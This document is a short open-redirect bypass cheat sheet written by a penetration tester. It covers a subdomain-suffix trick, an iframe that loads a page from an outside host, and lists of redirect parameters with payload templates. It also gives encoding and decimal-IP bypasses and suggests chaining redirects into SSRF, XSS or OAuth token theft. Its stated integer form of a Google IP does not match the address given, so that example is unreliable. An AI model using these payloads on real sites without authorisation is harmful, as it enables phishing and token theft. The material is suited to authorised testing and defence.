# Open Redirection Bypass Trick:

This bypass I found in a application while I doing pentesting. I hope it will helps you too!

1. While you I trying to redirect https://targetweb.com?url=http://attackersite.com it did not redirected!
2. I Created a new subdomain with with www.targetweb.com.attackersite.com
3. And when I tried to redirect with https://targetweb.com?url=www.targetweb.com.attackersite.com
4. It will successfully redirected to the www.targetweb.com.attackersite.com website!
5. Due to the bad regex it has been successfully bypass their protection!
6. By using Iframe SOP (<iframe sandbox="allow-scripts allow-same-origin" src="http://ruvlolmail.temp.swtest.ru/toplevel.html">)


**Method**

```
* Burp Proxy history & Burp Sitemap (look at URLs with parameters)
* Google dorking. E.g: inurl:redirectUrl=http site:target.com
* Functionalities usually associated with redirects:
	Login, Logout, Register & Password reset pages
	Change site language
	Links in emails
* Read JavaScript code
* Bruteforcing
	Look for hidden redirect parameters, for e.g.:
		/redirect?url={payload}&next={payload}&redirect={payload}&redir={payload}&rurl={payload}&redirect_uri={payload}
		/?url={payload}&next={payload}&redirect={payload}&redir={payload}&rurl={payload}&redirect_uri={payload}

* Try using the same parameter twice:
	 ?next=whitelisted.com&next=google.com
* If periods filtered, use an IPv4 address in decimal notation 
	http://www.geektools.com/geektools-cgi/ipconv.cgi
* Try a double-URL and triple-URL encoded version of payloads
* Try redirecting to an IP address (instead of a domain) using different notations: 
	IPv6, IPv4 in decimal, hex or octal
* For XSS, try replacing alert(1) with prompt(1) & confirm(1)
* If extension checked, 
	try ?image_url={payload}/.jpg
* Try target.com/?redirect_url=.uk (or [any_param]=.uk). 
	If it redirects to target.com.uk, then it’s vulnerable! target.com.uk and target.com are different domains.
* Chaining open redirect with
	SSRF
	OAuth token disclosure
	XSS
	CRLF injection

```
```
*  If The application is filtering HTTPS protocol.
*  If The application is filtering the Host & IP Address.
     http://2899905732 : 2899905732 is the Integer IP representation of google.com’s IP: 142.250.64.100

     The final payload looked like the following:
     https://www.target.com/login?forward=http://2899905732
```

**Common Injection Parameters**

```
/{payload}
?forward={payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}

```



### Authors:
* [@bishal0x01](https://twitter.com/bishal0x01)

### Reference Tweets:
* https://twitter.com/bishal0x01/status/1262021038080053248
